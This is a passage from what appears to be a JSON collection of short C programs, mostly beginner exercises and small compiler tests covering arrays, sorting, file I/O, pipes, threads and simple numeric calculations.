time/((clock_t)1000000000));\n  mp_integral = 0;\n  montecarlo(i, samples);\n }\n}",
    "#include <stdio.h>\nvoid print_pattern(int ile_gwiazdek, char *pattern) {\n  for(int i = 0; i < ile_gwiazdek; i++) {\n    printf(\"%s\", pattern);\n  }\n  printf(\"\\n\");\n}\nint main() {\n  int n = 4;\n  for(int i = 0; i < n; i++) {\n    print_pattern(8, \" *\");\n    print_pattern(8, \"* \");\n  }\n}",
    "#include <stdio.h>\nint main()\n{\n  int p, q, r, s, matrix[10][10], transpose[10][10];\n  printf(\"Enter the number of rows and columns of a matrix\\n\");\n    scanf(\"%d%d\", &p, &q);\n      printf(\"Enter elements of the matrix\\n\");\n  for (r = 0; r < p; r++)\n      for (s = 0; s < q; s++)\n            scanf(\"%d\", &matrix[r][s]);\n  for (r = 0; r < p; r++)\n      for (s = 0; s < q; s++)\n            transpose[s][r] = matrix[r][s];\n  printf(\"Transpose of the matrix:\\n\");\n  for (r = 0; r < q; r++) {\n      for (s = 0; s < p; s++)\n            printf(\"%d\\t\", transpose[r][s]);\n                printf(\"\\n\");\n                  }\n  return 0;\n  }",
    "#include <stdio.h>\nint main()\n{\n    int a[7],most,i,x,y,day;\n    for(int j=0;j<7;j++)\n    {\n        scanf(\"%d %d\",&x,&y);\n        a[j]=x+y;\n    }\n    most=a[0];\n    for(i=1;i<7;i++)\n    {\n        if (a[i]>most)\n        {\n            most=a[i];\n            day=i;\n        }\n    }\n    printf(\"%d\",day+1);\n    return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nchar *msg[2] = { \"Hello\", \"World\"};\nint main()\n{\n char buf[16];\n int p[2], i;\n if (pipe(p) == -1) {\n perror (\"pipe call failed\");\n exit(1);\n}\nfor (i = 0; i < 2; i++)\n write (p[1], msg[i], 16);\nfor (i = 0; i < 2; i++) {\n read (p[0], buf, 16);\n printf (\"%s\\n\", buf);\n }\n}",
    "#include<stdio.h>\nint digsum(int d)\n{\n    int k;\n    if(d<10) return d;\n    k=(d/100);\n    d=d%100;\n    k+=(d/10)+(d%10);\n    if(k>9) return digsum(k);\n    else return k;\n}\nint main()\n{\n    char s[100];\n    int i,d;\n    while(1)\n    {\n        scanf(\"%s\", s);\n        if(s[0]=='0') break;\n        i=0;\n        d=0;\n        while(s[i]!='\\0')\n        {\n            d+=s[i]-'0';\n            i++;\n        }\n        i=digsum(d);\n        printf(\"%d\\n\",i);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nvoid traverse(int arr[], int len)\n{\n    for (int i = 0; i < len; i++){\n        printf(\"%d \",arr[i]);\n    }\n}\nvoid reverse(int arr[], int len){\n    for (int i = 0; i <= len/2; i++)\n    {\n        int a = arr[i];\n        arr[i] = arr[len - i];\n        arr[len - i] = a;\n    }\n}\nint main()\n{\n    int arr[] = {1,2,3,4,5,6};\n    int len = 6;\n    traverse(arr, len);\n    reverse(arr, len-1);\n    printf(\"\\n\");\n    traverse(arr, len);\n}",
    "#include <stdio.h>\nint main(){\n int n[10], i=0, num;\n scanf(\"%d\", &num);\n while(i < 10){\n  if(i == 0){\n   n[i] =num;\n  } else {\n   n[i] = n[i-1]*2;\n  }\n  printf(\"N[%d] = %d\\n\", i, n[i]);\n  i++;\n }\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main(){\n    int n, count =0;\n    printf(\"Enter nummber of co-ordinates you want to enter: \");\n    scanf(\"%d\",&n);\n    int arr[n][2];\n    for(int i=0; i<n; i++){\n        printf(\"Enter co-ordinates %d: \", i+1);\n        for(int j =0; j<2; j++){\n            scanf(\"%d\", &arr[i][j]);\n        }\n    }\n    for(int i=0; i<n; i++){\n        for(int j=0; j<n; j++){\n            if(j==i){}\n            else{\n                if(arr[j][0]==arr[i][0]){\n                    for(int k=0; k<n; k++){\n                        if(k==i){}\n                        else{\n                            if(arr[k][1]==arr[i][1]){\n                                for(int l=0; l<n; l++){\n                                    if(l==k){}\n                                    else{\n                                        if(arr[l][0]==arr[k][0]){\n                                            if(arr[l][1]==arr[j][1]){\n                                                count++;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    printf(\"\\nNumber of rectangles: %d\", count/4);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    float n1, n2, n3, n4, n_exame, media;\n    scanf(\"%f %f %f %f\", &n1, &n2, &n3, &n4);\n    media = (2*n1+3*n2+4*n3+n4)/10 ;\n    printf(\"Media: %.1f\\n\", media);\n    if (media >= 7.0)\n    {\n        printf(\"Aluno aprovado.\\n\");\n    }\n    else if (media <= 6.9 && media >= 5.0)\n    {\n        printf(\"Aluno em exame.\\n\");\n        scanf(\"%f\", &n_exame);\n        printf(\"Nota do exame: %.1f\\n\", n_exame);\n        if ((media + n_exame)/2 >= 5.0)\n        {\n            printf(\"Aluno aprovado.\\n\");\n            printf(\"Media final: %.1f\\n\", (media + n_exame)/2);\n        }\n        else\n        {\n            printf(\"Aluno reprovado.\\n\");\n            printf(\"Media final: %.1f\\n\", (media + n_exame)/2);\n        }\n    }\n    else\n    {\n        printf(\"Aluno reprovado.\\n\");\n    }\n    return 0;\n}",
    "#include <unistd.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n\n\n\npthread_mutex_t mutex;\nvoid *thrd_func(void *arg)\n{\n    int num = (unsigned long long)arg;\n    int delay_time = 0, count = 0;\n    int res;\n    res = pthread_mutex_lock(&mutex);\n    if (res)\n    {\n        printf(\"Thread %d lock failed\\n\", num);\n        pthread_exit(((void*)0));\n    }\n    printf(\"Thread %d is starting\\n\", num);\n    for (count = 0; count < 3; count++)\n    {\n        delay_time = (int)(rand() * 10.0/((0x7fffffff))) + 1;\n        sleep(delay_time);\n        printf(\"\\tThread %d: job %d delay = %d\\n\",num, count, delay_time);\n    }\n    printf(\"Thread %d finished\\n\", num);\n    pthread_exit(((void*)0));\n}\nint main(void)\n{\n    pthread_t thread[3];\n    int no = 0, res;\n    void * thrd_ret;\n    srand(time(((void*)0)));\n    pthread_mutex_init(&mutex, ((void*)0));\n    for (no = 0; no < 3; no++)\n    {\n        res = pthread_create(&thread[no], ((void*)0), thrd_func, (void*)(unsigned long long)no);\n        if (res != 0)\n        {\n            printf(\"Create thread %d failed\\n\", no);\n            exit(res);\n        }\n    }\n    printf(\"Create treads success\\n Waiting for threads to finish...\\n\");\n    for (no = 0; no < 3; no++)\n    {\n        res = pthread_join(thread[no], &thrd_ret);\n        if (!res)\n        {\n            printf(\"Thread %d joined\\n\", no);\n        }\n        else\n        {\n            printf(\"Thread %d join failed\\n\", no);\n        }\n        pthread_mutex_unlock(&mutex);\n    }\n    pthread_mutex_destroy(&mutex);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nvoid usage(char *name) {\n    printf(\"%s file chn-all chn-begin chn-number\\n\", name);\n}\nint main(int argc, char **argv) {\n    char *name = argv[0];\n    if (argc < 5) {\n        usage(name);\n        return -1;\n    }\n    char *fn = argv[1];\n    int chn = atoi(argv[2]);\n    int bgn = atoi(argv[3]);\n    int num = atoi(argv[4]);\n    if (chn == 0 || num == 0) {\n        usage(name);\n        return -1;\n    }\n    FILE *in = fopen(fn, \"ro\");\n    char out_fn[128] = {0};\n    sprintf(out_fn, \"%s.%d.%d.%d\", fn, chn, bgn, num);\n    FILE *out = fopen(out_fn, \"w\");\n    int32_t i;\n    for (i = 0; ; i++) {\n        int x;\n        int ret = fread(&x, sizeof(int32_t), 1, in);\n        if (ret != 1) {\n            break;\n        }\n        int r = i % chn;\n        if (bgn <= r && r < bgn + num) {\n            fwrite(&x, sizeof(int32_t), 1, out);\n        }\n    }\n    fclose(in);\n    fclose(out);\n    return 0;\n}",
    "int main()\n{\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n    float a,b;\n    printf(\"Enter a value for A: \");\n    scanf(\"%f\",&a);\n    printf(\"Enter a value for B: \");\n    scanf(\"%f\",&b);\n    printf(\"%f + %f = %f\\n\",a,b,a+b);\n    printf(\"%f - %f = %f\\n\",a,b,a-b);\n    printf(\"%f * %f = %f\\n\",a,b,a*b);\n    printf(\"%f / %f = %f\\n\",a,b,a/b);\n    printf(\"%f to the %f power = %f\\n\",a,b,pow(a,b));\n    printf(\"The square root of %f is %f\\n\",a,sqrt(a));\n    printf(\"The square root of %f is %f\\n\",b,sqrt(b));\n    return(0);\n}",
    "#include <stdio.h>\nvoid copy_arr(int src[], int dst[], int n);\nvoid copy_ptr(int *src, int *dst, int n);\nvoid copy_arr2d(int src[][5], int dst[][5], int n);\nvoid show_arr(int arr[], int n);\nvoid show_arr2d(int arr[][5], int n);\nint main(void)\n{\n    int src[2][5] = {\n        {1, 2, 3, 4, 5},\n        {6, 7, 8, 9, 0}\n    };\n    int dst1[2][5];\n    copy_arr2d(src, dst1, 2);\n    show_arr2d(dst1, 2);\n    printf(\"\\n---------------------------------------------\\n\");\n    return 0;\n}\nvoid copy_arr(int src[], int dst[], int n)\n{\n    int i;\n    for (i = 0; i < n; i++)\n        dst[i] = src[i];\n}\nvoid copy_ptr(int *src, int *dst, int n)\n{\n    int *end = src + n;\n    while (src < end)\n        *dst++ = *src++;\n}\nvoid show_arr(int arr[], int n)\n{\n    int i;\n    for (i = 0; i < n; i++)\n        printf(\"%d \", arr[i]);\n    putchar('\\n');\n}\nvoid copy_arr2d(int src[][5], int dst[][5], int n)\n{\n    int i;\n    for (i = 0; i < n; i++)\n        copy_arr(src[i], dst[i], 5);\n}\nvoid show_arr2d(int arr[][5], int n)\n{\n    int i;\n    for (i = 0; i < n; i++)\n        show_arr(arr[i], 5);\n}",
    "#include <stdio.h>\n\nfloat menor_nota(float valor[3]) {\n float menor = valor[0];\n for (int i = 1; i < 3; i++) if (valor[i] < menor) menor = valor[i];\n return menor;\n }\nint main() {\n    float notas[3];\n    printf(\"Informe a nota dos 30 alunos: \");\n for (int i = 0; i < 3; i++) scanf(\"%f\", &notas[i]);\n printf(\"\\n A menor nota foi: %2.2f\", menor_nota(notas));\n}",
    "#include <stdio.h>\nint main() {\n  int n, i;\n  int sum = 0;\n  printf(\"Enter a number you want to calculate the sum for..  \");\n  scanf(\"%d\", &n);\n  for( i = 1 ; i <= n ; i++ )\n  {\n    sum = sum + i;\n  }\n  printf(\"The summation of the numbers is %d\", sum);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(int argc, char** argv){\n  if (3 > argc) {\n    printf(\"Nombre de param\u00e8tres insuffisant\\n\");\n    return 1;\n  }\n  int value1 = atoi(argv[1]);\n  int value2 = atoi(argv[2]);\n  int i = 0, j = 0;\n  int result = 0;\n  if(value1 < value2)\n  {\n for(j = value1; j < value2+1; j++)\n {\n     for(i = value1; i < value2+1; i++)\n        {\n            result = i * j;\n            printf(\"%i \", result);\n        }\n        printf(\"\\n\");\n }\n  }\n  else if(value1 > value2)\n  {\n for(j = value1; j > value2-1; j--)\n {\n     for(i = value1; i > value2-1; i--)\n        {\n            result = i * j;\n            printf(\"%i \", result);\n        }\n        printf(\"\\n\");\n }\n  }\n  else if(value1 == value2)\n  {\n      printf(\"%i\", value1*value2);\n  }\n    return 0;\n}",
    "#include <stdint.h>\n#include <stdio.h>\nint32_t main() {\n    if (1 < 2) {\n        putchar('O');\n        putchar('K');\n    } else {\n        putchar('K');\n        putchar('O');\n    }\n    putchar('\\n');\n}",
    "#include<stdio.h>\nint main(void)\n{\n printf(\"gz liu\");\n printf(\"\\ngz\\nliu\");\n printf(\"\\ngz liu\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    int valor;\n    int constante1 = 0;\n    int constante2 = 0;\n    double pi=0;\n    scanf(\"%d\", &valor);\n    for(int i = 0; i < valor; i++){\n        if (i % 2 == 0){\n            pi = pi + (double)4/(double)(1 + constante1);\n            constante1 = constante1 + 4;\n        }\n        else if (i % 2 != 0){\n            pi = pi - (double)4/(double)(3 + constante2);\n            constante2 = constante2 + 4;\n        }\n    }\n    printf(\"%0.6f\", pi);\n    return 0;\n    system(\"pause\");\n}",
    "#include<stdio.h>\nint main()\n{\n        printf(\"this is the cmd222222\\n\");\n        return 0;\n}",
    "#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main(){\n printf(\"start\\n\");\n printf(\"sleep\\n\"); usleep(10 * 1000 * 1000);\n uid_t uid = 1000;\n gid_t gid = 100;\n printf(\"setuid: %d\\n\", uid);\n setuid(uid);\n printf(\"sleep\\n\"); usleep(10 * 1000 * 1000);\n printf(\"setgid: %d\\n\", gid);\n setgid(gid);\n printf(\"exit\\n\");\n}",
    "#include <time.h>\n#include <stdio.h>\n#include <stdlib.h>\nint run_dice(void)\n{\n return rand() % 6 + 1;\n}\nint main(void)\n{\n srand(time(((void*)0)));\n int dice = run_dice();\n printf(\"dice = %d\\n\", dice);\n return 0;\n}",
    "#include <stdio.h>\nvoid showInfo( int height, int width , int length )\n{\n  printf( \"  sizeof(int)  = %2lu\\n\" , sizeof(int) );\n  printf( \"  sizeof(int*) = %2lu\\n\" , sizeof(int*) );\n  printf( \"  [height, width, length] = [%2d,%2d,%2d]\\n\\n\" ,\n             height , width , length );\n}\nvoid showVariable( char* pId , int* pDim )\n{\n  printf( \"      address of %s = %#lx, value at address = %2d\\n\" ,\n             pId,\n             (unsigned long)pDim ,\n             *pDim );\n}\nint main( void )\n{\n  int height = 10;\n  int width = 20;\n  int length = 40;\n  printf( \"\\nValues:\\n\\n\");\n  showInfo( height , width , length );\n  printf( \"\\nUsing address of each named variables...\\n\\n\");\n  showVariable( \"height\" , &height );\n  showVariable( \"width \" , &width );\n  showVariable( \"length\" , &length );\n}",
    "#include <stdio.h>\nint main(void){\n   float f, c;\n   printf(\"Digite uma temperatura F: \");\n   scanf(\"%f\", &f);\n   c = (f-32)* 5/9;\n   printf(\"Sua temperatura e %.1f C\", c);\n   return 0;\n}",
    "#include<stdio.h>\n#include<stdbool.h>\nint read_line(char str[],int n);\nint read_line_a(char str[],int n);\nint read_line_b(char str[],int n);\nint read_line_c(char str[],int n);\nint read_line_d(char str[],int n);\nint main(void)\n{\n printf(\"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n char str[10];\n int n=10;\n printf(\"Original readline function: \");\n read_line(str,n);\n printf(\"str= %s\",str);\n n=10;\n printf(\"\\n(a) Modified readline function: Ignore leading spaces.\\n\");\n read_line_a(str,n);\n printf(\"str= %s\",str);\n printf(\"\\n(b) Modified readline function: Stop reading at first white space character.\\n\");\n read_line_b(str,n);\n printf(\"str= %s\",str);\n printf(\"\\n(c) Modified readline function: Stop reading at new line character and include new line character.\\n\");\n read_line_c(str,n);\n printf(\"str= %s\",str);\n printf(\"\\n(d) Modified readline function: Have it leave behind characters that it doesn\u2019t have room to store.\\n\");\n read_line_d(str,n);\n printf(\"str= %s\",str);\n printf(\"\\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n return 0;\n}\nint read_line(char str[],int n)\n{\n int ch, i=0;\n while((ch=getchar()) != '\\n' && ch !=(-1))\n  if(i<n)\n   str[i++]=ch;\n str[i]='\\0';\n return i;\n}\nint read_line_a(char str[],int n)\n{\n int ch, i=0;\n _Bool first_non_space_char=0;\n while((ch=getchar()) != '\\n' && ch !=(-1))\n {\n  if(ch != ' ' && !first_non_space_char)\n   first_non_space_char=1;\n  if(i<n && first_non_space_char)\n   str[i++]=ch;\n }\n str[i]='\\0';\n return i;\n}\nint read_line_b(char str[],int n)\n{\n int ch, i=0;\n while((ch=getchar()) != '\\n' && ch !=(-1) && ch != ' ')\n  if(i<n)\n   str[i++]=ch;\n str[i]='\\0';\n return i;\n}\nint read_line_c(char str[],int n)\n{\n int ch, i=0;\n while((ch=getchar()) != '\\n' && ch !=(-1))\n  if(i<n-2)\n   str[i++]=ch;\n str[i++]='\\n';\n str[i]='\\0';\n return i;\n}\nint read_line_d(char str[],int n)\n{\n int ch, i=0;\n while((ch=getchar()) != '\\n' && ch !=(-1))\n  if(i<n-1)\n   str[i++]=ch;\n str[i]='\\0';\n return i;\n}",
    "#include <stdio.h>\nvoid selection_sort(int A[], int n) {\n for (int i = 0; i < n; i++) {\n  int min_index = i;\n  for (int j = i + 1; j < n; j++) {\n   if (A[j] < A[min_index]) {\n    min_index = j;\n   }\n  }\n  int temp = A[i];\n  A[i] = A[min_index];\n  A[min_index] = temp;\n }\n}\nint main(void)\n{\n int A[] = {-2, 12, 1, 3, 4, 22, 432, 423423, 3};\n int n = sizeof(A) / sizeof(int);\n selection_sort(A, n);\n for (int i = 0; i < n; i++)\n  printf(\"%d \", A[i]);\n printf(\"\\n\");\n return 0;\n}",
    "#include<stdio.h>\n\nvoid Amigos(int a, int b);\nint main(void){\n  int N[512], i, j, q;\n  printf(\"Digite a quantidade de pares:\\n\");\n  scanf(\"%d\", &q);\n  printf(\"Digite os pares de n\u00fameros:\\n\");\n  for(i=0; i<q; i++){\n  scanf(\"%d\", &N[i]);\n  }\n  for(j=0; j<q; j+=2){\n  Amigos(N[j],N[j+1]);\n  }\n  return 0;\n}\nvoid Amigos(int a, int b){\n  int i, contA, contB;\n  contA = contB = 0;\n  for(i=1; i<=(a/2); i++){\n    if(a%i == 0){\n      contA += i;\n    }\n  }\n  for(i=1; i<=(b/2); i++){\n    if(b%i == 0){\n      contB += i;\n    }\n  }\n  if((contA == b) && (contB == a)){\n    printf(\"S\\n\");\n  }else{\n    printf(\"N\\n\");\n  }\n}",
    "#include <stdio.h>\nint str_len(char str[]);\nint main(void){\n    printf(\"%d\\n\", str_len(\"Eu nao valho nada - Lagum\"));\n    return 0;\n}\nint str_len(char str[]){\n    int i = 0;\n    while(str[i] != '\\0'){\n        i++;\n    }\n    return i;\n}",
    "#include <stdio.h>\nint reverse(int num, int i, int rev);\nint main()\n{\n  int num, i, rev = 0;\n  printf(\"Enter a number:\");\n  scanf(\"%d\", &num);\n  int result = reverse(num, i, rev);\n  printf(\"The reversed number=%d\", result);\n}\nint reverse(int num, int i, int rev)\n{\n  for (i = num; i > 0; i = i / 10)\n  {\n    rev = rev * 10 + i % 10;\n  }\n  return rev;\n}",
    "#include<stdio.h>\n#include<string.h>\nint main()\n{\n FILE *RW;\n char fnam[20],ch[2]=\"y\",wrt,rad;\n printf(\"Enter filename with extention: \");\n scanf(\"%s\",fnam);\n RW=fopen(fnam,\"w\");\n while(strcmp(ch,\"Y\")==0 || strcmp(ch,\"y\")==0)\n {\n  wrt=getchar();\n  putc(wrt,RW);\n  printf(\"Another character? \");\n  scanf(\"%s\",ch);\n }\n fclose(RW);\n RW=fopen(fnam,\"r\");\n while((rad=getc(RW))!=(-1))\n {\n  printf(\"%c\",rad);\n }\n fclose(RW);\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n for(int i = 18; i > 1; i--) {\n  printf(\"%d\", i);\n  if(i % 3 == 0) {\n   printf(\"***\\n\");\n   continue;\n  }\n  else if(i == 11) {\n   printf(\"this one goes to ELEVEN\\n\");\n   continue;\n  }\n  printf(\"\\n\");\n }\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nunsigned char memory[0xFFFF];\nchar stack[0x3F];\nint PC = 0x8800;\nunsigned char R[0xF];\nchar RI;\nchar SP;\nint file_size;\nint main(int argc, char** argv)\n{\n    FILE *file = fopen(argv[1], \"rb\");\n    if (file == ((void*)0))\n    {\n        printf(\"Unable to load file.\\n\");\n    }\n    else\n    {\n        printf(\"Loaded successfully.\\n\");\n        fseek(file, 0L, (2));\n        file_size = ftell(file);\n        fseek(file, 0L, (0));\n        printf(\"File Size: %d bytes\\n\", file_size);\n        for(int i=0; i<file_size; i++)\n        {\n            memory[0x8800+i] = fgetc(file);\n        }\n        for(int i=0; i<0xFFFF; i++)\n        {\n            printf(\"location 0x%04x: 0x%04x\\n\", i, memory[i]);\n        }\n    }\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main() {\n    int n1,n2,n3,i,j=0,k=0,s1=0,s2=0,s3=0;\n    scanf(\"%d %d %d\",&n1,&n2,&n3);\n    int arr1[n1];\n    int arr2[n2];\n    int arr3[n3];\n    for(i=0;i<n1;i++){\n        scanf(\"%d\",&arr1[i]);\n        s1+=arr1[i];\n    }\n    for(i=0;i<n2;i++){\n        scanf(\"%d\",&arr2[i]);\n        s2+=arr2[i];\n    }\n    for(i=0;i<n3;i++){\n        scanf(\"%d\",&arr3[i]);\n        s3+=arr3[i];\n    }\n    i=0;\n    while(1){\n        if((s1==s2 && s2==s3) || s1==0 || s2==0 || s3==0)\n            break;\n        if(s1>=s2 && s1>=s3)\n            s1-=arr1[i++];\n        else if(s2>=s1 && s2>=s3)\n            s2-=arr2[j++];\n        else\n            s3-=arr3[k++];\n    }\n    if(s1==0 || s2==0 || s3==0)\n        printf(\"0\");\n    else\n        printf(\"%d\",s1);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid HelloWorld()\n{\n printf(\"Hello World!\");\n}\nint main(int argc, char ** argv)\n{\n HelloWorld();\n return 0;\n}",
    "#include <math.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\nextern uint64_t __bswapdi2(uint64_t);\nint test__bswapdi2(uint64_t a, uint64_t expected) {\n  uint64_t actual = __bswapdi2(a);\n  if (actual != expected)\n    printf(\"error in test__bswapsi2(0x%0llX) = 0x%0llX, expected 0x%0llX\\n\", a,\n           actual, expected);\n  return actual != expected;\n}\nint main() {\n  if (test__bswapdi2(0x123456789ABCDEF0LL, 0xF0DEBC9A78563412LL))\n    return 1;\n  if (test__bswapdi2(0x0000000100000002LL, 0x0200000001000000LL))\n    return 1;\n  return 0;\n}",
    "#include<stdio.h>\nint max(int a, int b)\n{\n if(a>=b)\n  return a;\n else\n  return b;\n}\nint main()\n{\n int a[100001]={};\n int n,k,b,maxx,ans,t;\n int i,j;\n scanf(\"%d\",&n);\n scanf(\"%d\",&b);\n a[b]=a[b]+1;\n maxx=b;\n for(i=1;i<n;i++){\n  scanf(\"%d\",&b);\n  maxx=max(maxx,b);\n  a[b]=a[b]+1;\n }\n scanf(\"%d\",&k);\n for(j=maxx;j>=0;j--){\n  if(a[j]!=0)\n   k--;\n  if(k==0){\n   ans=j;\n   t=a[j];\n   break;\n  }\n }\n printf(\"%d %d\",ans,t);\n return 0;\n}",
    "#include <stdint.h>\nint8_t implicitConversion(uint32_t argc) {\n  return argc;\n}\nint main(int argc, char **argv) {\n  return !implicitConversion(~0U);\n}",
    "#include <stdio.h>\nint max(int num1, int num2);\nint main() {\n  int a = 100;\n  int b = 200;\n  int ret;\n  ret = max(a, b);\n  printf(\"Max value is : %d\\n\", ret);\n  return 0;\n}\nint max(int num1, int num2) {\n  int result;\n  if (num1 > num2)\n    result = num1;\n  else\n    result = num2;\n  return result;\n}",
    "#include <stdio.h>\nint main() {\n  int n;\n  scanf(\"%d\", &n);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(int argc,char** argv)\n{\n FILE *f;\n FILE *g;\n signed short ipart,qpart;\n double angle_old;\n double angle_new;\n double delta;\n signed short pcm;\n angle_old=angle_new=0;\n if (argc!=3)\n {\n  fprintf((stderr),\"please run with %s INPUT.iq192 OUTPUT.pcm\\n\",argv[0]);\n  return 0;\n }\n f=fopen(argv[1],\"rb\");\n g=fopen(argv[2],\"wb\");\n fread(&ipart,sizeof(short),1,f);\n while (!feof(f))\n {\n  fread(&qpart,sizeof(short),1,f);\n  angle_old=angle_new;\n  angle_new=atan2(qpart,ipart);\n  delta=angle_new-angle_old;\n  if (delta<-3.14159265358979323846) delta+=2*3.14159265358979323846;\n  if (delta>3.14159265358979323846) delta-=2*3.14159265358979323846;\n  pcm=(signed short)(delta*8192.0/3.14159265358979323846);\n  fwrite(&pcm,sizeof(short),1,g);\n  fread(&ipart,sizeof(short),1,f);\n }\n fclose(f);\n fclose(g);\n}",
    "#include <stdio.h>\nvoid getExamMark(int *exam);\nvoid getCourseworkMark(int *cour);\nvoid calculateFinalMark(int *exam, int *cour, int *final);\nvoid printFinalMark(int final);\nint markIsValid(int mark, int maxMark);\nint main(void)\n{\n    int exam, cour, final;\n    getExamMark(&exam);\n    getCourseworkMark(&cour);\n    calculateFinalMark(&exam, &cour, &final);\n    printFinalMark(final);\n}\nvoid getExamMark(int *exam)\n{\n    do\n    {\n        printf(\"Exam Mark (0 to 100) : \");\n        scanf(\"%d\", exam);\n    } while (!markIsValid(*exam, 100));\n}\nvoid getCourseworkMark(int *cour)\n{\n    do\n    {\n        printf(\"Coursework Mark (0 to 40) : \");\n        scanf(\"%d\", cour);\n    } while (!markIsValid(*cour, 40));\n}\nvoid calculateFinalMark(int *exam, int *cour, int *final)\n{\n    *final = 0.6*(*exam) + *cour;\n}\nvoid printFinalMark(int final)\n{\n    printf (\"Final Mark = %d\\n\", final);\n}\nint markIsValid(int mark, int maxMark)\n{\n    if (mark >= 0 && mark <= maxMark)\n    {\n        return 1;\n    }\n    else\n    {\n        return 0;\n    }\n}",
    "#include <stdio.h>\nint main() {\n float pi;\n pi = 3.141592;\n printf(\"Pi is approximately %f\\n\",pi);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n for(int age=12;age<=200;++age)\n {\n  if(age%12==0&&age%7==0)\n  {\n   int x=age/6+age/12+age/7+5+age/2+4;\n   if(x==age)\n   printf(\"%d\",x-4);\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    float peso=0,sal[2];\n    int x,cont=0,con=0;\n    for(x=0;x<=1;x++)\n    {\n        printf(\"Diga seu peso:\");\n        scanf(\"%f\",&peso);\n    }\n    for(x=0;x<=1;x++)\n    {\n        printf(\"Qual o seu sal\u00e1rio?\");\n        scanf(\"%f\",&sal[x]);\n    }\n    if(peso>=50)\n    {\n     cont++;\n    }\n    printf(\"%d\\n\",cont);\n    if(sal[x]>=1000 || sal[x]<=3000)\n    {\n        con++;\n    }\n    printf(\"%d\\n\",con);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nprintf(\"Happy New Year\");\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar g_digito[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};\nlong imprimir_em_base(int n, int b) {\n    if (n == 0) return 0;\n    imprimir_em_base(n / b, b);\n    printf(\"%c\", g_digito[n % b]);\n}\nint main(int argc, char** argv) {\n    int n = 0, b = 0;\n    printf(\"Digite o n\u00famero e a base: \");\n    scanf(\"%d %d\", &n, &b);\n    imprimir_em_base(n, b);\n    printf(\"\\n\");\n    return 0;\n}",
    "int x = 1;\nint main ()\n{\n  int t = (1/(1>=x))>>1;\n  if (t != 0) __builtin_abort();\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n#include <stdlib.h>\n#include <math.h>\ndouble grados_a_RAD(double grados);\ndouble ObtenerPosX(double vel_ini, double tiempo, double angulo_ini);\ndouble ObtenerPosY(double altura_inicial, double vel_ini, double tiempo, double angulo_ini, double gravedad);\ndouble ObtenerTiempoTotal(double vel_ini, double ang_ini, double gravedad);\n\n\nint main(int argc, char *argv[]) {\n double posObjetivoX = 0.0f, posObjetivoY = 0.0f;\n printf(\"Elija la distancia del objetivo: \");\n scanf(\" %lf\",&posObjetivoX);\n printf(\"Elija la altura del objetivo: \");\n scanf(\" %lf\",&posObjetivoY);\n double vi, t, ang_ini, alt_ini, t_total;\n double posTiroX, posTiroY;\n _Bool AcertoTiro = 0;\n do\n {\n  printf(\"\\nElija el angulo inicial del proyectil: \");\n  scanf(\" %lf\", &ang_ini);\n  printf(\"Elija la velocidad inicial del proyectil: \");\n  scanf(\" %lf\", &vi);\n  t = 0.0f;\n  t_total = ObtenerTiempoTotal(vi, ang_ini, 9.81f);\n  while( !AcertoTiro && t < t_total )\n  {\n   posTiroX = ObtenerPosX( vi, t, ang_ini);\n   posTiroY = ObtenerPosY( 0, vi, t, ang_ini, 9.81f);\n   printf(\"X=%lf y Y=%lf\\n\", posTiroX, posTiroY );\n   t += 0.1;\n   if( posTiroX > posObjetivoX - 5.0f / 2 && posTiroX < posObjetivoX + 5.0f / 2 )\n   {\n    if( posTiroY > posObjetivoY - 5.0f / 2 && posTiroY < posObjetivoY + 5.0f / 2 )\n    {\n     AcertoTiro = 1;\n    }\n   }\n  }\n  if( !AcertoTiro )\n   printf(\"\\nNo acerto, intente de nuevo\\n\");\n }while(!AcertoTiro);\n printf(\"\\nAcerto en el objetivo!\\n\");\n return 0;\n}\ndouble grados_a_RAD(double grados)\n{\n return grados * 3.14159265358979323846 / 180.0;\n}\ndouble ObtenerPosX(double vel_ini, double tiempo, double angulo_ini)\n{\n double gradosradianes = grados_a_RAD(angulo_ini);\n return vel_ini * tiempo * cos( gradosradianes );\n}\ndouble ObtenerPosY(double altura_ini, double vel_ini, double tiempo, double angulo_ini, double gravedad)\n{\n double gradosradianes = grados_a_RAD(angulo_ini);\n return altura_ini + ( vel_ini * tiempo * sin( gradosradianes ) ) - ( 0.5 * gravedad * tiempo * tiempo );\n}\ndouble ObtenerTiempoTotal(double vel_ini, double ang_ini, double gravedad)\n{\n double gradosradianes = grados_a_RAD(ang_ini);\n return 2 * vel_ini * sin(gradosradianes) / gravedad;\n}",
